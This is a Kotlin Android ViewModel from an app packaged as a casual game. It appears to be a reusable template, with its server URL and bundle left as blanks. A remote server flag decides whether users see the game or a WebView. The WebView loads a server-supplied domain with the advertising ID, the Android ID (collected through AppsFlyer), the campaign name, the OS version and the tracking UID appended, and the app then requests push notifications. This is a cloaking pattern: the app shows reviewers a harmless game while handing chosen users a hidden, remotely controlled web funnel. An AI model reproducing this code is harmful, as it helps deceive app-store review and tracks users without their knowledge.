package com.casualgame.shabla_4

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.onesignal.OneSignal
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException

class MyViewModel(private val context: Context, private val saving: Prefs) : ViewModel() {
    //TODO BUNDLE
    private val bundle = ""




    private var servChecker = 0
    private val _openGameFragment = MutableLiveData<Boolean>()
    val openGameFragment: LiveData<Boolean>
        get() = _openGameFragment
    private var _openWebView = MutableLiveData<Boolean>()
    val openWebView: LiveData<Boolean>
        get() = _openWebView
    private val namingShared: SharedPreferences = context.getSharedPreferences("naming", AppCompatActivity.MODE_PRIVATE)
    private fun UID(): String = AppsFlyerLib.getInstance().getAppsFlyerUID(context) ?: "none"

    fun setHostAndGeo() {
        if (saving.checkerHost) {
            _openWebView.postValue(true)
        } else {
            val s1ss = Request.Builder()
                    //TODO URL CHANGE
                .url("")
                .build()
            OkHttpClient().newCall(s1ss).enqueue(object : Callback {
                override fun onResponse(call: Call, response: Response) {
                    val vvvv = JSONObject(response.body?.string()?.trim() ?: "")
                    servChecker = vvvv.getInt("value")
                    if (servChecker == 1) {
                        if (vvvv.has("allowed") && vvvv.getBoolean("allowed")){
                            saving.checkerHost = true
                            saving.oneSingalKey = vvvv.getString("os")
                            saving.domain = vvvv.getString("dom")
                            saving.af = vvvv.getString("af")
                            getAds()
                        } else {
                            _openGameFragment.postValue(true)
                        }
                    } else {
                        saving.checkerHost = false
                        _openGameFragment.postValue(true)
                    }
                }

                override fun onFailure(call: Call, e: IOException) {
                    Log.e("ERR", "Error!: ${e.message}", e)
                }
            })
        }
    }

    private fun getAds() {
        if (!saving.isAdIdSaved) {
            getAdvertisingId(context)
        } else {
            _openWebView.postValue(true)
            saving.adiki_id
        }
    }
    private fun getAdvertisingId(context: Context): String {
        val advNull = "00000000-0000-0000-0000-000000000000"
        return try {
            val advertisingInfo = AdvertisingIdClient.getAdvertisingIdInfo(context).id
                ?: advNull
            saving.adiki_id = advertisingInfo
            getAppsFlyer()
            advertisingInfo
        } catch (e: IOException) {
            e.printStackTrace()
            ""
        } catch (e: GooglePlayServicesNotAvailableException) {
            e.printStackTrace()
            ""
        } catch (e: GooglePlayServicesRepairableException) {
            e.printStackTrace()
            ""
        }
    }

    private fun getAppsFlyer() {
        if (saving.finale_l != "") {
            _openGameFragment.postValue(true)
        } else {
            val naming =
                namingShared.getString("naming", "") ?: namingShared.getString("naming", "") ?: ""
            val version = Build.VERSION.RELEASE
            val subk = "sub_id_"
            val l =
                "${saving.domain}${subk}1=$naming&${subk}2=$bundle&${subk}3=$version&${subk}4=${saving.adiki_id}&${subk}5=${UID()}"
            saving.finale_l = l
            beginApp()
        }

        AppsFlyerLib.getInstance().start(context)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        AppsFlyerLib.getInstance()
            .init(saving.af, af, context.applicationContext)
        Handler(Looper.getMainLooper()).postDelayed({
            if (saving.finale_l == "") {
                _openGameFragment.postValue(true)
            }
        }, 9400)

    }


    private val af = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(tsfsd: MutableMap<String, Any>?) {
            val cocijcuhcxhux = tsfsd?.get("campaign").toString()
            namingShared.edit().putString("naming", cocijcuhcxhux).apply()
        }

        override fun onConversionDataFail(p0: String?) {
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }
    private fun beginApp() {
        getOneSignal()
        _openWebView.postValue(true)
    }

    private fun getOneSignal() {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.setAppId(saving.oneSingalKey)
        OneSignal.unsubscribeWhenNotificationsAreDisabled(true)
        OneSignal.initWithContext(context)
        OneSignal.promptForPushNotifications()
    }
}

